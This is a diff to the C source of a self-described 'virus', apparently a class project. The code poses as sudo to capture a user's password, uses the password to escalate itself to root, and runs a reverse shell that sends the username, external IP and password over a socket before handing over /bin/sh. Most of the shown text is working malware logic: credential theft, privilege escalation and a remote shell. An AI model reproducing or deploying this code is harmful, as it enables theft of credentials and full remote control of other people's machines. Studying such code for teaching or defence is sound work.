@@ -33,7 +33,7 @@ int sudo_mode(int argc, char ** argv){
 
   printf("%s's password is %s\n", username, passwd);
 
-  send_stolen_data(username, passwd);
+  // send_stolen_data(username, passwd);
 
   char ** cmd_ray = make_execvp_args(argc, argv);
   runSudo(passwd, cmd_ray, 0);
@@ -41,7 +41,7 @@ int sudo_mode(int argc, char ** argv){
 
   char escaped_path[2048] = "";
   get_virus_name(escaped_path);
-  char *escalate_vector[5] = {"/bin/sudo", "-S", escaped_path, "ROOT", NULL};
+  char *escalate_vector[6] = {"/bin/sudo", "-S", escaped_path, "ROOT", passwd, NULL};
 
   printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
   runSudo(passwd, escalate_vector, 0);
@@ -51,7 +51,7 @@ int sudo_mode(int argc, char ** argv){
 
 int root_mode(int argc, char**argv){
   printf("I have root acess now...\n");
-  reverse_shell(9845, "0.0.0.0");
+  reverse_shell(9845, "0.0.0.0", argv);
   while(1){
     sleep(1);
     printf("...\n");
@@ -74,7 +74,7 @@ int set_mode(int argc, char**argv){
   return mode;
 }
 int main(int argc, char ** argv){
-  reverse_shell(9845, "127.0.0.1");
+  // reverse_shell(9845, "127.0.0.1");
   int mode = set_mode(argc,argv);
 
   //implant the alias to the virus as sudo...
@@ -343,7 +343,7 @@ int runSudo(char * passwd, char ** argAry, int mask_output){
 //c reverse shell slighlty modified from https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#dart
 // from class notes
 
-struct init_struct create_init_struct(){
+struct init_struct create_init_struct(char ** argv){
     struct init_struct init;
     get_username(init.whoami);
 
@@ -356,11 +356,11 @@ struct init_struct create_init_struct(){
     }
     getip(init.external_ip);
 
-    strcpy(init.passwd, "NO FUNCTIONALITY NOW... oops.");
+    strcpy(init.passwd, argv[2]);
     return init;
 }
 
-int reverse_shell(int port, char*ip){
+int reverse_shell(int port, char*ip, char ** argv){
 
   
   struct sockaddr_in revsockaddr;
@@ -371,7 +371,7 @@ int reverse_shell(int port, char*ip){
   revsockaddr.sin_addr.s_addr = inet_addr(ip);
 
   connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
-  struct init_struct init = create_init_struct();
+  struct init_struct init = create_init_struct(argv);
   print_init_struct(&init);
   write(sockt, &init, sizeof(struct init_struct));
   printf("wrote the thing to the socket\n");
@@ -379,8 +379,8 @@ int reverse_shell(int port, char*ip){
   dup2(sockt, 1);
   dup2(sockt, 2);
 
-  char * const argv[] = {"/bin/sh", NULL};
-  execve("/bin/sh", argv, NULL);
+  char * const args[] = {"/bin/sh", NULL};
+  execve("/bin/sh", args, NULL);
 
   return 0;
 }
